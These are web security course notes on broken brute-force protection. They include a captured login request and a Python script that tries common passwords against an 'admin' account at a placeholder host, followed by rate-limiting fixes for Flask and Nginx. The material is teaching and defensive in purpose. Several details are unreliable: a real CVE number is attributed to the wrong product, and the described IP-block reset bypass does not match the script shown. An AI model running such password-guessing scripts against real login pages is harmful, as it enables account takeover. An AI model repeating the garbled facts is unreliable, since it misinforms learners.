---
course: Web Security
topic: Authentication Vulnerabilities
tags: [web-security]
---

## Authentication Vulnerabilities: Broken Brute Force Protection

### Introduction to Authentication Mechanisms

Authentication is the process of verifying the identity of a user, device, or system. In web applications, authentication typically involves a user providing a username and password to prove their identity. However, authentication mechanisms can be vulnerable to various attacks, including brute-force attacks, which involve systematically checking all possible passwords until the correct one is found.

### Understanding Brute-Force Attacks

A brute-force attack is a method of gaining unauthorized access to a system by trying every possible combination of passwords until the correct one is discovered. This type of attack is particularly effective against weak or commonly used passwords.

#### Example: Real-World Breach

One notable example of a brute-force attack is the breach of LinkedIn in 2012, where hackers obtained over 6.5 million hashed passwords and used brute-force techniques to crack them. This breach highlighted the importance of strong password policies and robust authentication mechanisms.

### Importance of Brute-Force Protection

To mitigate the risk of brute-force attacks, web applications often implement mechanisms such as rate limiting, account lockout policies, and CAPTCHAs. These measures aim to slow down or prevent attackers from making repeated login attempts.

#### Rate Limiting

Rate limiting restricts the number of login attempts a user can make within a specified time frame. For example, an application might allow only five login attempts per minute. If a user exceeds this limit, their IP address may be temporarily blocked.

#### Account Lockout Policies

Account lockout policies automatically lock an account after a certain number of failed login attempts. Once an account is locked, the user cannot log in until the lockout period expires or an administrator unlocks the account.

#### CAPTCHAs

CAPTCHAs (Completely Automated Public Turing test to tell Computers and Humans Apart) are used to verify that the user is human. They typically involve solving a visual or audio challenge that is difficult for automated systems to bypass.

### Broken Brute-Force Protection

Broken brute-force protection occurs when these mechanisms are either absent or poorly implemented, allowing attackers to perform brute-force attacks with relative ease.

#### Example: CVE-2021-26084

CVE-2021-26084 is a vulnerability in the WordPress REST API that allows attackers to bypass rate-limiting protections. By exploiting this vulnerability, attackers can perform brute-force attacks on user accounts, potentially gaining unauthorized access.

### Lab Scenario: Broken Brute-Force Protection

In this lab scenario, we will simulate a brute-force attack on a web application with broken brute-force protection. The goal is to understand how such vulnerabilities can be exploited and how to defend against them.

#### Setup

The web application in question has a login form that accepts a username and password. The application does not properly enforce rate limiting or account lockout policies, allowing attackers to make repeated login attempts without being blocked.

#### Tools Used

- **Burp Suite**: A comprehensive toolkit for web application security testing.
- **Python Scripting**: To automate the brute-force attack.

### Step-by-Step Attack Simulation

#### Step 1: Identify the Login Form

First, we need to identify the login form and understand its structure. We can use Burp Suite's Proxy module to intercept and analyze the HTTP requests sent during the login process.

```http
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

username=admin&password=123456
```

#### Step 2: Configure Burp Suite

We will use Burp Suite's Repeater module to manually send login requests and observe the responses. This helps us understand the behavior of the application when incorrect passwords are entered.

```http
HTTP/1.1 200 OK
Date: Tue, 01 Aug 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1024

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h1>Login Failed</h1>
    <p>Incorrect username or password.</p>
</body>
</html>
```

#### Step 3: Automate the Brute-Force Attack

Since manual brute-forcing is inefficient, we will automate the process using Python. We will use Burp Suite's Intruder module to generate a list of potential passwords and send them to the server.

```python
import requests

# List of potential passwords
passwords = ["password", "123456", "qwerty", "letmein", "admin"]

# Target URL
url = "http://target.example.com/login"

for password in passwords:
    data = {
        "username": "admin",
        "password": password
    }
    response = requests.post(url, data=data)
    print(f"Trying password: {password}")
    if "Login Failed" not in response.text:
        print(f"Success! Password is: {password}")
        break
```

#### Step 4: Exploit the Vulnerability

By running the above script, we can see that the application does not properly enforce rate limiting or account lockout policies. After two incorrect password attempts, the attacker can log in with a valid username and password, resetting the counter and allowing further attempts.

### How to Prevent / Defend Against Broken Brute-Force Protection

#### Detection

To detect broken brute-force protection, organizations can monitor login attempts and look for patterns indicative of brute-force attacks. Tools like Splunk or ELK Stack can be used to analyze logs and identify suspicious activity.

#### Prevention

1. **Implement Rate Limiting**: Limit the number of login attempts per user or IP address within a specified time frame.
2. **Account Lockout Policies**: Automatically lock accounts after a certain number of failed login attempts.
3. **CAPTCHAs**: Use CAPTCHAs to verify that the user is human.
4. **Strong Password Policies**: Enforce strong password requirements, such as minimum length, complexity, and expiration.

#### Secure Coding Fixes

Here is an example of how to implement rate limiting in a Flask application:

```python
from flask import Flask, request, jsonify
from flask_limiter import Limiter

app = Flask(__name__)
limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/login', methods=['POST'])
@limiter.limit("5/minute")  # Allow 5 login attempts per minute
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Check credentials
    if username == "admin" and password == "securepassword":
        return jsonify({"message": "Login successful"})
    else:
        return jsonify({"message": "Login failed"}), 401

if __name__ == '__main__':
    app.run(debug=True)
```

#### Configuration Hardening

Ensure that your web server and application configurations are hardened against brute-force attacks. For example, configure Nginx to limit the number of connections per IP address:

```nginx
http {
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    server {
        location /login {
            limit_conn addr 5;  # Limit to 5 connections per IP
            proxy_pass http://backend;
        }
    }
}
```

### Conclusion

Understanding and defending against broken brute-force protection is crucial for maintaining the security of web applications. By implementing robust rate limiting, account lockout policies, and CAPTCHAs, organizations can significantly reduce the risk of brute-force attacks. Regularly monitoring and auditing login attempts can help detect and respond to potential threats.

### Practice Labs

For hands-on practice with authentication vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on various web security topics, including authentication vulnerabilities.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that demonstrates common web application vulnerabilities.

These labs provide practical experience in identifying and mitigating authentication vulnerabilities, helping you develop the skills needed to secure web applications effectively.

---
<!-- nav -->
[[03-Authentication Vulnerabilities Broken Brute Force Protection and IP Block|Authentication Vulnerabilities Broken Brute Force Protection and IP Block]] | [[Web Security (PortSwigger)/13-Authentication Vulnerabilities/07-Lab 6 Broken brute force protection IP block/00-Overview|Overview]] | [[05-Lab Setup Broken Brute Force Protection IP Block|Lab Setup Broken Brute Force Protection IP Block]]
